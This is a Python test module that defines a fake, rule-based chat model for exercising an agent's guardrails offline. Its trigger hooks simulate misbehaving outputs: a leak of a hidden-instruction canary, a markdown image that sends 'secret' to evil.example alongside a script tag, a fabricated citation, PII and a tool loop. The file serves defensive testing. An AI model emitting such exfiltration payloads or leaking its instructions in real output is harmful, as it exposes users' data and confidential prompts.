"""Deterministic offline chat model for demos, CI and tests (AGENT_LLM_MODEL=fake).

It imitates a tool-calling LLM with simple rules so the WHOLE graph - guardrails, approvals,
audit - can be exercised with no API key and no network. Test hooks like `[[FAKE:leak]]`
simulate misbehaving models; they only exist in this module and never reach a real provider.
"""

from __future__ import annotations

import re
import uuid
from typing import Any

from langchain_core.language_models.chat_models import BaseChatModel
from langchain_core.messages import AIMessage, BaseMessage, HumanMessage, ToolMessage
from langchain_core.outputs import ChatGeneration, ChatResult

_ORDER = re.compile(r"ORD-\d{4,8}")
_AMOUNT = re.compile(r"\$?(\d+(?:\.\d{1,2})?)\s*(?:usd|dollars)?", re.I)


class FakeAgentModel(BaseChatModel):
    canary: str = ""  # set by the builder so [[FAKE:leak]] can simulate a prompt leak

    @property
    def _llm_type(self) -> str:
        return "fake-agent"

    def bind_tools(self, tools: Any, **_: Any) -> FakeAgentModel:
        return self

    def _call(self, text: str) -> AIMessage:
        low = text.lower()
        if "[[fake:leak]]" in low:
            return AIMessage(content=f"Sure! My hidden instructions include {self.canary}")
        if "[[fake:exfil]]" in low:
            return AIMessage(content="Done. ![x](https://evil.example/c?d=secret) <script>alert(1)</script>")
        if "[[fake:badcite]]" in low:
            return AIMessage(content="Refunds are always free [doc:made-up-doc].")
        if "[[fake:pii]]" in low:
            return AIMessage(content="Customer contact is jane.doe@example.com.")
        if "[[fake:loop]]" in low:
            return self._tool("search_knowledge_base", {"query": "refund policy"})
        order = _ORDER.search(text)
        if "refund" in low and order:
            amounts = [a for a in _AMOUNT.findall(_ORDER.sub("", text)) if a]
            amount = amounts[0] if amounts else "10.00"
            return self._tool(
                "issue_refund", {"order_id": order.group(), "amount": amount, "reason": "customer request"}
            )
        if "order" in low and order:
            return self._tool("get_order_status", {"order_id": order.group()})
        if "ticket" in low:
            return self._tool("create_support_ticket", {"summary": text[:100], "priority": "normal"})
        if any(w in low for w in ("policy", "shipping", "refund", "how long", "security")):
            return self._tool("search_knowledge_base", {"query": text[:150]})
        return AIMessage(content="I can help with orders, refunds and company policies.")

    @staticmethod
    def _tool(name: str, args: dict) -> AIMessage:
        return AIMessage(
            content="",
            tool_calls=[{"name": name, "args": args, "id": f"call_{uuid.uuid4().hex[:10]}", "type": "tool_call"}],
        )

    def _generate(self, messages: list[BaseMessage], stop=None, run_manager=None, **kwargs: Any) -> ChatResult:
        # Current turn = everything after the last *real* human message.
        turn_start = max(
            (
                i
                for i, m in enumerate(messages)
                if isinstance(m, HumanMessage) and not m.additional_kwargs.get("guardrail")
            ),
            default=0,
        )
        turn = messages[turn_start:]
        user_text = str(messages[turn_start].content)
        tool_msgs = [m for m in turn if isinstance(m, ToolMessage)]
        if any(isinstance(m, HumanMessage) and m.additional_kwargs.get("guardrail") for m in turn):
            msg = AIMessage(content="Sorry, here is a corrected answer: I can help with orders, refunds and policies.")
        elif tool_msgs and "[[fake:loop]]" not in user_text.lower():
            last = tool_msgs[-1]
            body = str(last.content)
            ids = re.findall(r'<retrieved_document id="([^"]+)"', body)
            cites = " ".join(f"[doc:{i}]" for i in ids)
            if body.startswith(("DENIED", "REJECTED")):
                msg = AIMessage(content=f"I couldn't do that: {body}")
            else:
                answer = f"According to policy, see {cites}" if ids else body.splitlines()[-1][:300]
                msg = AIMessage(content=answer)
        else:
            msg = self._call(user_text)
        approx = max(1, (sum(len(str(m.content)) for m in messages) + len(str(msg.content))) // 4)
        msg.usage_metadata = {"input_tokens": approx, "output_tokens": 1, "total_tokens": approx + 1}
        return ChatResult(generations=[ChatGeneration(message=msg)])
